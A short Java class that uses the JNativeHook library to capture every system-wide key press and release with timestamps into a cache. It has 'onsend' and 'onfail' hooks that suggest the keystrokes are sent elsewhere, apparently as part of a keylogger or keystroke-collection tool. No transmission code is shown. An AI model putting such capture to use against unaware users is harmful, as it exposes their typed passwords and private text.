package keys;

import Manager.keystorage;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.util.ArrayList;
import java.util.List;

public class Nativekeyboard implements NativeKeyListener {

    private List<keystorage> keycache = new ArrayList<>();
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        keycache.add(new keystorage(e.getKeyCode(),true,System.currentTimeMillis()));

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        keycache.add(new keystorage(e.getKeyCode(),false,System.currentTimeMillis()));
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {

    }

    public  void onsend(){
        keycache.clear();
    }

    public void onfail(){
        System.out.println("keystroke failed to send data");

    }
    public List<keystorage> getKeycache() {
        return keycache;
    }
}
